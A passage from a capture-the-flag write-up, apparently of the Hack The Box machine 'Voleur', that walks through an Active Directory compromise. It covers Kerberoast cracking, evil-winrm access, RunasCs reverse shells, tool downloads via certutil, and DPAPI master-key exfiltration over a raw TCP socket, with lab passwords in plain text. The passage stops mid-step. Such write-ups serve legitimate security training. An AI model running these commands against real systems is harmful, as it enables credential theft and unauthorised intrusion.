[!] [{'result': 49, 'description': 'invalidCredentials', 'dn': '', 'message': '8009030C: LdapErr: DSID-0C090770, comment: AcceptSecurityContext error, data 52e, v4f7c\x00', 
'referrals': None, 'saslCreds': None, 'type': 'bindResponse'}]

```

### Hashcat

```
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ hashcat kerberoasting.hashes /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu--0x000, 735/1471 MB (256 MB allocatable), 2MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

* Device #1: Not enough allocatable device memory or free host memory for mapping.

Started: Sun Jun  7 00:02:40 2026
Stopped: Sun Jun  7 00:02:55 2026

```

```
$ hashcat svc_winrm.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol 
...[snip]...
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$b2054c9d13850ff6ed45fdbe6746b7f0$965636eba88dfd0a3131dbd3d83770a1cd40398b02725c0fb62f34ab951e91933e2ee95487fa7bb950c906af2989e899f9db592930caaa35de089b51331e26c8e862623537c19b2eb932d1d9fdd46239055c1948136a3675d6516bff98434df6b7149affec20eadc6fdaf51988c7fb4ee9feecc3e160b870908145ac1f9b20123b5f657abdd03a579a2d8bf0309a2541944c7eb1dc6fa5f0ba403b44b21fe2172a8f314d2983f353ae04ce585ceabb817666246f8283d90495a676770ec033a2b73d7f2db5fa0b860abe2dd4ade3091b5d484816af77cce1adc5ee53e659af2a69543c6263433fdd343d7d5a03a83ecbdb2dbcd39c3c4a7c2b9424e12b9f0dda52737e2682a1e48a5535580126b4672121406c56c2b1e1c406db35bbe1a7b026f90b581a41808a6bb1f6ba935b5b2c3722ea2d68b136a24d1bf1c9f0ed5028ec436668260d61a681f1f13873554acf5a9b7dea272b401b24e5abbdcfc7568f2f86a277861b5feb0429b69190c4d0d7cc14b00f4765163b894c208be9b00bac60feacd696c27e96c88a82ec37a03a923cd43d8166fbc99d301485be556ff3f48a168d7a30e185c29c513c069329cce2f04be32051e42197bd8b415ef1dfcd55016423e9b897b0d7558ac3f026eea525dc09beeff00ee960d6efc9c87673c4ecac44694f103662b5da29a3d95e966919e14ccad6013c86e6d765ae7fe0866e5183dda17c87ed4f2b2a49ff43bbbee2ee60628d9fea2fbbc5d03483834675b0bbe6b640d687949890f4fa369a081d91ea475e72e9d67fe3aa7e1ccfdcd862bcb08664812f83d20dd9d3c9ab2e93eeecd886dd0c209c95bc023d1c77c6607d1bfd50a989928058984f2a0d5a07eb85761feec4d84222ec7406d39086946058d788c63d17f2b195b1a4c25712f1be4e59e40c8195f29c3b5ed799e503639ab30c7b0d523b9c6158c7e240e7ce3fcd11fe4ad55f5ae507e77b9f51ab3aa275595fe8a21552b58ab193775f96e552e19dd8a7eee8ce0c9fdf97f55b6bc2ecc0a90b0cff2d42ba102699e8b531418ff59719479e8e2676d2674356847110d095666ae31e7ad6efaab8930c3d420c5c9abd457b79ebca98689d7a938c5e8ff7e3c794e7068ae7d1cc2598205ca791ce037c7f9a231cb87085dc785ebe894a8354710511e1112c8336c2b35e28a38ba3af23ae28ec1fa149ddeeddcd55730e80571c56f74b4243fceeae6cdfb3048a73a272f4c684d78176cc8e8ee70154ddd74b5158ffcc9e5f4d4dafd6abc55855edceff763870ae07be87d3e5b6296a71c2670feed12decfb28ce0cd9dd8373882670faac2db338e1f40e887b8bd24440ae70262fcf95ec00f591390150e5c9fdee3d63f13a74bb0e22eb4270922c941bce589112926683559002c33ece5a70e4f304cba8b737417fe30bdb8ba1b39647bde8a64d3794f563a3c7a34d6b14e2784e02bb65663058548a:AFireInsidedeOzarctica980219afi
...[snip]...
```

***

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Remote-Management" >}} Remote-Management is the Port 5985 , although the nxc is failed , but it really exists, So using the getST.py to make the evil-winrm / evil-winrm-py success , krb5-user

{{< /toggle >}}

Remote-Management is the Port 5985 , although the nxc is failed , but it really exists

![Pasted image 20260612120018.png](/ob/Pasted%20image%2020260612120018.png)

```
┌──(root㉿kali-linux-2025-2)-[/home/parallels]
└─# ntpdate voleur.htb                                                                                                
2026-06-07 08:40:55.632703 (+0800) +28794.572710 +/- 0.143668 voleur.htb 10.129.8.132 s1 no-leap
CLOCK: time stepped by 28794.572710
                                                                                                                                                                                
┌──(root㉿kali-linux-2025-2)-[/home/parallels]
└─# /usr/share/doc/python3-impacket/examples/getTGT.py 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi' -dc-ip 10.129.8.132
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
                                            
```

```
┌──(root㉿kali-linux-2025-2)-[/home/parallels]
└─# export KRB5CCNAME=svc_winrm.ccache 

```

`netexec` can’t check `winrm` over Kerberos, but I have good reason to believe from the Bloodhound data that the account should be able to access it.

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ echo "nameserver 10.129.8.132" | sudo tee /etc/resolv.conf
nameserver 10.129.8.132

```

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ sudo apt install krb5-user
The following packages were automatically installed and are no longer required:
  amass-common              libfuse2t64            libmjpegutils-2.1-0t64  librubberband2     libwiretap15                          python3-protobuf
  curlftpfs                 libgav1-1              libmongoc-1.0-0t64      libsframe1         libwsutil16                           python3-pysmi
  firmware-ti-connectivity  libgdal36         
```

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ kinit svc_winrm@VOLEUR.HTB
Password for svc_winrm@VOLEUR.HTB: 

```

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb              
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> whoami 
voleur\svc_winrm
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $evil-winrm-py -i dc.voleur.htb -k --no-pass --spn-hostname dc.voleur.htb
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc.voleur.htb:5985' as 'svc_winrm@VOLEUR.HTB'
evil-winrm-py PS C:\Users\svc_winrm\Documents>
```

***

{{< toggle "Tag 🏷️" >}}

{{< tag "Port369-LDAP-ldapsearch-failed" >}} With the owned account to do the LDAP inquiry for finding the deleted users information in Active Directory (AD)  ,but failed.

{{< /toggle >}}

![Pasted image 20260606233104.png](/ob/Pasted%20image%2020260606233104.png)

```
ldapsearch -H ldap://10.129.8.132 -D "CN=ryan.naylor@DC.voleur.htb"  -w "HollowOct31Nyt"  -b "CN=Deleted Objects,DC=DC,DC=voleur,DC=htb" -s sub -E 1.2.840.113556.1.4.417  "(isDeleted=TRUE)" "*"
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ ldapsearch -H ldap://10.129.8.132 -D "CN=svc_ldap@DC.voleur.htb"  -w "M1XyC9pW7qT5Vn"  -b "CN=Deleted Objects,DC=DC,DC=voleur,DC=htb" -s sub -E 1.2.840.113556.1.4.417  "(isDeleted=TRUE)" "*"
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C09059D, comment: AcceptSecurityContext error, data 52e, v4f7c

```

# Failed

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Mimikatz" >}} Failed !!!! Mimikatz must be run as a local administrator or SYSTEM and requires debugging rights to interact with the protected LSASS (Local Security Authority Subsystem Service) memory process.

{{< /toggle >}}

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
--2026-06-09 14:04:45--  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/18496166/28e3acb5-ca66-40d5-bc68-f76f5bfabecf?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-06-09T07%3A00%3A58Z&rscd=attachment%3B+filename%3Dmimikatz_trunk.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-06-09T06%3A00%3A24Z&ske=2026-06-09T07%3A00%3A58Z&sks=b&skv=2018-11-09&sig=d2kxic5S5bZVPRaXwlMtrLLAkRI6yVay4jAtrvZIoCI%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4MDk4NTM4NSwibmJmIjoxNzgwOTg1MDg1LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.lokNiT8wPjybievvKMdQVgUSmkuhU4EB55lcmR2gZao&response-content-disposition=attachment%3B%20filename%3Dmimikatz_trunk.zip&response-content-type=application%2Foctet-stream [following]
```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $unzip mimikatz_trunk.zip 
Archive:  mimikatz_trunk.zip
  inflating: kiwi_passwords.yar      
  inflating: mimicom.idl             
  inflating: README.md               
   creating: Win32/
  inflating: Win32/mimidrv.sys       
  inflating: Win32/mimikatz.exe      
  inflating: Win32/mimilib.dll       
  inflating: Win32/mimilove.exe      
  inflating: Win32/mimispool.dll     
   creating: x64/
  inflating: x64/mimidrv.sys         
  inflating: x64/mimikatz.exe        
  inflating: x64/mimilib.dll         
  inflating: x64/mimispool.dll  
```

Upload by *Evil-WinRM*

```
*Evil-WinRM* PS C:\> cd C:\ProgramData
*Evil-WinRM* PS C:\ProgramData> 
```

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload mimikatz.exe
                                        
Info: Uploading /home/tester/Desktop/HTB/Voleur/mimikatz.exe to C:\Users\svc_winrm\Documents\mimikatz.exe
                                        
Data: 1807016 bytes of 1807016 bytes copied
                                        
Info: Upload successful!

```

keep loop it

```
mimikatz #
mimikatz #
mimikatz #
mimikatz #

```

Run it by

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > pssword.txt
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> type pssword.txt

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz(commandline) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz(commandline) # exit
Bye!

```

***

### Winpeas

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-winpeas" >}} Setting up the winpeas and analyze ,redirect the output to a netcat listener so you get a local copy on your Kali host. Then you can run bat winpeas.txt to slowly scroll through the results in color.

{{< /toggle >}}

```
echo "nameserver 10.129.10.35" | sudo tee /etc/resolv.conf
```

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> $env:PROCESSOR_ARCHITECTURE
AMD64

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $wget https://github.com/peass-ng/PEASS-ng/releases/download/20260604-085abf96/winPEASx64.exe
--2026-06-09 14:40:02--  https://github.com/peass-ng/PEASS-ng/releases/download/20260604-085abf96/winPEASx64.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found

```

From windows to download the winPEASx64

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.16.128/winPEASx64.exe','C:\ProgramData\winPEASx64.exe')
```

open the server

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $sudo python3 -m http.server 80
[sudo] password for tester: 
Sorry, try again.
[sudo] password for tester: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.10.35 - - [09/Jun/2026 15:05:31] "GET /winPEASx64.exe HTTP/1.1" 200 -

```

```
*Evil-WinRM* PS C:\ProgramData> malloc(): unaligned fastbin chunk detected

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $evil-winrm-py -i dc.voleur.htb -k --no-pass --spn-hostname dc.voleur.htb
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc.voleur.htb:5985' as 'svc_winrm@VOLEUR.HTB'
evil-winrm-py PS C:\Users\svc_winrm\Documents>

```

on Linux

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $nc -lvnp 4444 > output.txt
Listening on 0.0.0.0 4444


```

on windows

```
evil-winrm-py PS C:\ProgramData> $client = New-Object Net.Sockets.TcpClient('10.10.16.128', 4444)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes('C:\ProgramData\output.txt')
$stream.Write($bytes, 0, $bytes.Length)
$client.Close()

```

### Bat

Using the bat to check

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $sudo apt install bat 
[sudo] password for tester: 
Installing:                     
  bat

Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 98
  Download size: 2,339 kB
  Space needed: 5,647 kB / 53.6 GB available

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $batcat output.txt

```

### windpeas checklist

And then go around , to check by tree /f

* / credentials
* / Network
* / System
* / Interesting
* / Program Files

***

### Active directory Enum

```
evil-winrm-py PS C:\IT> tree /f .
Folder PATH listing
Volume serial number is 0000022F A5C3:6454
C:\IT
+---First-Line Support
+---Second-Line Support
+---Third-Line Support

```

### RunasCs.exe

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-RunasCs-1" >}} If you have the account , but the account dont have the rdp , winrm etc 's movement , the RunasCs can help you to switch account on the same machine in the domain by revshell .

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
--2026-06-09 17:03:14--  https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found

```

```
evil-winrm-py PS C:\ProgramData> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.16.128:443
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-61f73f$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4836 created in background.

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $sudo rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.10.35 64848
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port369-LDAP-deleted-account-windows" >}} Using the windows 's  AD module 's  Get-ADOptionalFeature found the deleted account in Recycle Bin Feature and recover it .

{{< /toggle >}}

```
PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110


```

```
PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db

```

Use the RunasCs.exe to switch the account

```
┌─[tester@parrot]─[/opt]
└──╼ $sudo  ./bloodhound-cli install
[+] Checking the status of Docker and the Compose plugin...
[+] Docker and the Compose plugin checks have passed
[+] Starting BloodHound environment installation
[*] A production YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
[*] A development YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
 bloodhound Pulling 
 graph-db Pulling 
 app-db Pulling 
 app-db Pulled 
 graph-db Pulled 
 bloodhound Pulled 
 Container bloodhound-graph-db-1  Running
 Container bloodhound-app-db-1  Running
 Container bloodhound-bloodhound-1  Running
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-graph-db-1  Healthy
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: 5Hi70AQLphfvzmzJ4fQF848plPx54UDj
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login

```

![Pasted image 20260610133043.png](/ob/Pasted%20image%2020260610133043.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-RunasCs" >}} If you have the account , but the account dont have the rdp , winrm etc 's movement , the RunasCs can help you to switch account on the same machine in the domain by revshell with  --bypass-uac sometime will success

{{< /toggle >}}

```
evil-winrm-py PS C:\Users\svc_winrm\Documents> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.16.128:443 --bypass-uac
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-18ee0d$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5920 created in background.
evil-winrm-py PS C:\Users\svc_winrm\Documents>

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $sudo rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.232.130 53481
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami 
whoami 
voleur\todd.wolfe
PS C:\Windows\system32> 
```

![Pasted image 20260610134512.png](/ob/Pasted%20image%2020260610134512.png)

```
PS C:\Users\todd.wolfe> tree /f . 
tree /f . 
Folder PATH listing
Volume serial number is 0000018F A5C3:6454
C:\USERS\TODD.WOLFE
+---3D Objects
+---Contacts
+---Desktop
�       Microsoft Edge.lnk
�       
+---Documents
+---Downloads
+---Favorites
�   �   Bing.url
�   �   
�   +---Links
+---Links
�       Desktop.lnk
�       Downloads.lnk
�       
+---Music
+---Pictures
+---Saved Games
+---Searches
+---Videos

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-Dataleak-Lazagne" >}} LaZagne.exe is a tool can automatcially find the sentive data , but if the data is in the innormal place , it would not check

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
--2026-06-10 13:47:28--  https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-relea
```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

```
PS C:\Users\todd.wolfe> certutil -urlcache -split -f http://10.10.16.128:80/LaZagne.exe C:\ProgramData\LaZagne.exe
certutil -urlcache -split -f http://10.10.16.128:80/LaZagne.exe C:\ProgramData\LaZagne.exe
****  Online  ****
  000000  ...
  9aaa1d
CertUtil: -URLCache command completed successfully.

```

```
PS C:\Users\todd.wolfe> C:\ProgramData\LaZagne.exe all
C:\ProgramData\LaZagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 1.9687511920928955

```

```
PS C:\IT> tree /f . 
tree /f . 
Folder PATH listing
Volume serial number is 000001EE A5C3:6454
C:\IT
+---First-Line Support
+---Second-Line Support
�   +---Archived Users
�       +---todd.wolfe
�           +---3D Objects
�           +---Contacts
�           +---Desktop
�           �       Microsoft Edge.lnk
�           �       
�           +---Documents
�           +---Downloads
�           +---Favorites
�           �   �   Bing.url
�           �   �   
�           �   +---Links
�           +---Links
�           �       Desktop.lnk
�           �       Downloads.lnk
�           �       
�           +---Music
�           +---Pictures
�           +---Saved Games
�           +---Searches
�           +---Videos
+---Third-Line Support

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-DPAPI" >}} Found the credential in AppData\Roaming\Microsoft\Credentials ,  and using the dpapi.py to decode the password

{{< /toggle >}}

ref : https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets

The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:

```
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls AppData\Roaming\Microsoft\Credentials
ls AppData\Roaming\Microsoft\Credentials


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3                                     


```

```
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials> type 772275FAD58525253490A9B0039791D3 
type 772275FAD58525253490A9B0039791D3 
,DO?��OzAOA-�,"OcL1<IR�A�^ :Enterprise Credential Data

fAQ�*	�`�_&=��?M?�C` Y6dOj0`�TkO
                                  �AOW<tK#A{v2�DygyC�_(%S�{,
                                                            �/,��?J�zAE^r.Q���~3ETrI
                                                                                    00?,�n%�s�#R
A'E?�_�Z��SaVcؓ!r-[���>�9I;VeV�?I~YjThd_r?�O?B>HDpug<6c5�J:�lJ._J �a.aE@?�?�Et+A�I�tu�~Ae
                                                                                        n?T"'-!\��8U���9W�?("�

```

And the master key is available as well:

```
# 1. Read the local file bytes first
$filePath = "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88"
$bytes = [System.IO.File]::ReadAllBytes($filePath)

# 2. Establish the connection immediately before sending
$client = New-Object System.Net.Sockets.TcpClient('10.10.16.128', 4444) # Ensure port matches your listener
$stream = $client.GetStream()

# 3. Write the data over the wire
$stream.Write($bytes, 0, $bytes.Length)

# 4. Clean up the connection cleanly
$stream.Close()
$client.Close()

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $nc -lvnp 4444 > 08949382-134f-4c63-b93c-ce52efc0aa88
Listening on 0.0.0.0 4444
Connection received on 10.129.232.130 53572

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $cat 772275FAD58525253490A9B0039791D3 
�Ќ����z�O���OcL�<�R���� :Enterprise Credential Data
f�Q�*	�`��&=���M��C� �6d�j0��Tk�
                                  ��OW�tK#A{v2��yg�C��(�S�{�
                                                            �/,���J�z�Ȉr.�Q�����E���
�'ʏ���Z����Vc��!r-[���>�9�;VeV����~�jTh�_r����B>HDpug<6�5�J:�lJ��J �a�a�@�����t+A�΃tu���en%���#R
                                                           
```

### SID

Credential Manager was introduced with Windows 7. It is like a digital vault to keep all of your credentials safe. All of the credentials are stored in a credentials folder which you will find at this location – **%Systemdrive%\Users\<Username>\AppData\Local\Microsoft\Credentials** and it is this folder that credential manager accesses. it also allows you to add, edit, delete, backup and even restore the passwords.

```
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls AppData\Roaming\Microsoft\Protect\
ls AppData\Roaming\Microsoft\Protect\


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-         1/29/2025   7:13 AM                S-1-5-21-3927696377-1337352550-2781715495-1110                       


```

### Guid

```
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> dir
dir


    Directory: C:\IT\Second-Line Support\Archived 
    Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88                                       


```

### dpapi.py

I’ll use `dpapi.py` to decrypt the master key:  with Guid and sid

```
└──╼ $/usr/share/doc/python3-impacket/examples/dpapi.py  masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $/usr/share/doc/python3-impacket/examples/dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
